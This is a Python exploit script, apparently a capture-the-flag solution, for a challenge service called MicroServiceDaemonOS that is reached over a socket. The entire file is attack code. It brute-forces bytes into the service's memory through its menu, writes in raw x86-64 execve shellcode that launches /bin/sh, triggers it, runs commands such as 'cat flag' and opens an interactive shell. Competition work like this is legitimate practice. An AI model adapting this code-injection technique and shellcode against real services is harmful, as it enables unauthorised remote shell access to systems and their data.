import sys
import time
import struct
import subprocess
import socket
import telnetlib
from collections import Counter
from io import BytesIO, SEEK_END, SEEK_SET

# just execve adapted to existing register values at routines entry
SHELLCODE = "/bin/sh\x00"
BOOTLOADER = "\x31\xf6\x31\xd2\x48\x05{}\x48\x97\x93\xb0\x3b\x0f\x05"


class PseudoSocket:
    def __init__(self, proc):
        self.buff = BytesIO()
        if isinstance(proc, socket._socketobject):
            self.socket = True
            self.proc = proc
        else:
            self.socket = False
            self.proc = proc

    def is_remote(self):
        return self.socket

    def read(self, count):
        chunk_size = 65536 if self.is_remote() else 1
        if self.buff.tell() >= chunk_size:
            self.buff = BytesIO()
        cur_pos = self.buff.tell()
        self.buff.seek(0, SEEK_END)
        buff_size = self.buff.tell() 
        self.buff.seek(cur_pos, SEEK_SET)
        if cur_pos == buff_size:
            self.buff.seek(0)
            self.buff.truncate()

        if buff_size < count:
            if self.socket:
                bytes_written = self.buff.write(self.proc.recv(chunk_size))
            else:
                bytes_written = self.buff.write(self.proc.stdout.read(chunk_size))
            self.buff.seek(0)
        return self.buff.read(count)

    def write(self, data):
        if self.socket:
            return self.proc.send(data)
        else:
            return self.proc.stdin.write(data)


def cmp_bytes(data, values):
    if len(data) < len(values):
        return False
    for idx, value in enumerate(values[::-1]):
        if data[-(idx + 1)] != value:
            return False
    return True


def read_until(handle, value='\n', exact=None):
    assert hasattr(handle, 'read'), "Should be readable"
    data = []
    if exact:
        res = handle.read(exact)
        print("GOTCHA : ", res)
        return res
    next_byte = None
    end_sign = list(value)
    while not cmp_bytes(data, end_sign):
        next_byte = handle.read(1)
        data.append(next_byte)
    return ''.join(data)

def write_string(handle, data, value='\n'):
    handle.write(data + value)


def eat_header(proc):
    print(read_until(proc))
    print(read_until(proc, value=': '))



def prepare_trustlets(proc):
    write_string(proc, "l")
    print(read_until(proc, value=': '))
    write_string(proc, "0")
    print(read_until(proc, value=': '))

    write_string(proc, "l")
    print(read_until(proc, value=': '))
    write_string(proc, "1")


def input_shellcode(proc, data):
    print("DATA IS : ", data)
    assert len(data) < 0x40, 'Too long shellcode, go away!'
    print(read_until(proc, value=': '))
    write_string(proc, "c")
    print(read_until(proc, value=': '))
    write_string(proc, "1")
    # call type
    print(read_until(proc, value=': '))
    write_string(proc, "s")
    # data length
    print(read_until(proc, value=': '))
    write_string(proc, str(len(data) + 2))
    # data offset
    print(read_until(proc, value=': '))
    print('inputting number of offsets etc')
    write_string(proc, str(len(data) + 1))
    print('now inputting sacred shit')
    # actual data
    write_string(proc, data + '\xaa')
    print("Finished inputting data")
    print("It says : ", read_until(proc))

    

def generate_bootstrap(proc, payload, index=None):
    print("[!] Gonna write shellcode...")
    hook_start_offset = -(index * 0x1000 + 0x4000)
    for idx, byte in enumerate(payload):
        generate_byte(proc, ord(byte), offset=str(hook_start_offset + idx))


def call_shellcode(proc):
    print("[*] Gotta call it !")
    print(read_until(proc, value=': '))
    write_string(proc, "c")
    read_until(proc, value=': ')
    write_string(proc, "1")
    read_until(proc, value=': ')
    write_string(proc, "g")
    print("WOw how!")
    # here comes the crash or shell
    time.sleep(1)
    write_string(proc, "whoami")
    print(read_until(proc))
    write_string(proc, "ls -al /")
    print(read_until(proc))
    write_string(proc, "cat flag")
    print(read_until(proc))


    # assert not proc.returncode, 'Shit, it crashed : {}'.format(proc.returncode)
    if proc.is_remote():
        proxy = telnetlib.Telnet()
        proxy.sock = proc.proc
        proxy.interact()
 

def determine_service_index(proc):
    generate_byte(proc, 0x40, offset=str(-0x8000000))
    print(read_until(proc, value=': '))
    write_string(proc, "c")
    read_until(proc, value=': ')
    write_string(proc, "0")
    read_until(proc, value=': ')
    write_string(proc, "g")
    read_until(proc, value=': ')
    write_string(proc, "0")
    read_until(proc, value=': ')
    write_string(proc, "32728")
    good_string = read_until(proc)
    stuff_set = Counter()
    for idx in range(len(good_string) // 4):
        stuff_set.update([good_string[idx*4:(idx+1)*4]])
    print(stuff_set)
    assert len(stuff_set) == 2, 'Something wrong... Try harder!'
    changed_murmur = sorted(list(stuff_set.items()), key=lambda x: x[1])[0][0]
    print(changed_murmur)
    found_page = good_string.index(changed_murmur) // 4
    print('Found chosen page : {}'.format(hex(found_page)))
    return found_page


def generate_byte(proc, value, size="2", offset="1", payload='A'):
    gotcha = False
    tries = 0
    while not gotcha:
        if tries % 256 == 0 :
            print("Already tried generating %d times" % tries)
            print("Proc size is : {}".format(sys.getsizeof(proc.buff)))
        tries += 1
        read_until(proc, value=': ')
        write_string(proc, "c")
        read_until(proc, value=': ')
        write_string(proc, "1")
        read_until(proc, value=': ')
        write_string(proc, "s")
        read_until(proc, value=': ')
        write_string(proc, size)
        read_until(proc, value=': ')
        write_string(proc, offset)
        write_string(proc, payload)
        got_smh = read_until(proc)
        # print(got_smh)
        #print(got_smh.encode('hex'))
        if ord(got_smh[0]) == value:
            break
    print('generated 1 byte {}'.format(value))
    
     


def main():
    # set to None for local process usage
    # remote_target = None
    remote_target = (('microservicedaemonos.ctfcompetition.com', 1337))
    if not remote_target:
        ll_proc = subprocess.Popen('./MicroServiceDaemonOS', stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        print('[+] Started  stuff...')
    else:
        ll_proc = socket.socket()
        ll_proc.connect(remote_target)

    proc = PseudoSocket(ll_proc)
    eat_header(proc)
    prepare_trustlets(proc)
    index = determine_service_index(proc)
    generate_bootstrap(
        proc,
        payload=BOOTLOADER.format(struct.pack('<I', index * 0x1000 + 0x4000)),
        index=index
    )
    print("GOnna hang!")
    input_shellcode(proc, SHELLCODE)
    print("[+] Done preparing, gotta fly, seeing you on the other side!")
    call_shellcode(proc)



if __name__ == '__main__':
    main()
